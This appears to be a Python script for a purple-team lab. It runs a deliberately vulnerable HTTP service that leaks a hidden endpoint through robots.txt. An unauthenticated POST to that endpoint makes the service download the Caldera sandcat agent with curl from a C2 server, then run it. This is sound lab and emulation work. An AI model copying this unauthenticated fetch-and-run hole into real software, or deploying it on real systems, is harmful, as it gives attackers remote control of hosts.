#!/usr/bin/env python3
import json
import os
import socket
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

HOST = "0.0.0.0"
PORT = 8081
CALDERA_SERVER = os.environ.get("CALDERA_SERVER", "http://192.168.56.10:8888")
DEFAULT_GROUP = os.environ.get("S13_GROUP", "s13-flow")
NODE_NAME = socket.gethostname()

LOG_FILE = Path("/var/log/purple-lab/lab-vuln-service.log")
LOG_FILE.parent.mkdir(parents=True, exist_ok=True)


def log(message: str) -> None:
    with LOG_FILE.open("a", encoding="utf-8") as handle:
        handle.write(f"{message}\n")


def install_agent() -> dict:
    target_dir = Path("/opt/caldera")
    target_dir.mkdir(parents=True, exist_ok=True)
    sandcat_path = target_dir / "sandcat"

    subprocess.run(
        [
            "curl",
            "-s",
            "-X",
            "POST",
            "-H",
            "file:sandcat.go",
            "-H",
            "platform:linux",
            f"{CALDERA_SERVER}/file/download",
        ],
        check=True,
        stdout=sandcat_path.open("wb"),
    )
    sandcat_path.chmod(0o755)

    subprocess.run(["pkill", "-f", "/opt/caldera/sandcat"], check=False)

    with open("/var/log/sandcat.log", "ab") as log_handle:
        subprocess.Popen(
            [
                str(sandcat_path),
                "-server",
                CALDERA_SERVER,
                "-group",
                DEFAULT_GROUP,
                "-paw",
                NODE_NAME,
                "-v",
            ],
            stdout=log_handle,
            stderr=log_handle,
        )

    return {"status": "ok", "node": NODE_NAME, "group": DEFAULT_GROUP, "paw": NODE_NAME}


class Handler(BaseHTTPRequestHandler):
    def _send_json(self, status_code: int, payload: dict) -> None:
        encoded = json.dumps(payload).encode("utf-8")
        self.send_response(status_code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(encoded)))
        self.end_headers()
        self.wfile.write(encoded)

    def do_GET(self):
        log(f"GET path={self.path} client={self.client_address[0]}")
        if self.path == "/":
            self._send_json(
                200,
                {
                    "service": "purple-pool-agent-gateway",
                    "version": "0.1",
                    "links": ["/robots.txt"],
                    "node": NODE_NAME,
                },
            )
            return
        if self.path == "/robots.txt":
            content = "User-agent: *\nDisallow: /api/info\n"
            encoded = content.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(encoded)))
            self.end_headers()
            self.wfile.write(encoded)
            return
        if self.path == "/api/info":
            self._send_json(
                200,
                {
                    "node": NODE_NAME,
                    "mode": "debug",
                    "bootstrap_hint": "/api/bootstrap",
                    "service": "purple-pool-agent-gateway",
                },
            )
            return

        self._send_json(404, {"status": "error", "message": "not found"})

    def do_POST(self):
        log(f"POST path={self.path} client={self.client_address[0]}")
        if self.path == "/api/bootstrap":
            try:
                result = install_agent()
                self._send_json(200, result)
            except Exception as exc:
                log(f"bootstrap_error node={NODE_NAME} error={exc}")
                self._send_json(500, {"status": "error", "node": NODE_NAME, "message": str(exc)})
            return

        self._send_json(404, {"status": "error", "message": "not found"})

    def log_message(self, format, *args):
        return


if __name__ == "__main__":
    log(f"service_start node={NODE_NAME} port={PORT}")
    HTTPServer((HOST, PORT), Handler).serve_forever()
